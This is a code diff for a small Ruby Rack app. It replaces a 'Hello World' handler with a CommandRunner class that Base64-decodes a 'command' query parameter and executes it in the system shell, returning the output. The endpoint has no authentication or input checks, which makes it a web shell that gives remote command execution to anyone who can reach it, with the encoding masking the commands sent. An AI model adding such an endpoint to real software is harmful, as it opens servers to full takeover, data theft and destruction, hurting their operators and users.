@@ -1,4 +1,5 @@
 require 'rack/cors'
+require 'base64'
 
 use Rack::Cors do
   allow do
@@ -7,12 +8,32 @@ use Rack::Cors do
   end
 end
 
-class App
+class CommandRunner
 
   def call(env)
-    [200, {}, ['Hello World!']]
+    @env = env
+    result = %x[#{command}] if command
+    if result && $?.success?
+      [200, headers, [result]]
+    else
+      [500, headers, ['Could not run command']]
+    end
+  end
+
+  private
+  def command
+    return unless params['command']
+    Base64.decode64(params['command'])
+  end
+
+  def headers
+    {'Content-Type' => 'text/plain'}
+  end
+
+  def params
+    Rack::Utils.parse_query(@env['QUERY_STRING'])
   end
 
 end
 
-run App.new
+run CommandRunner.new
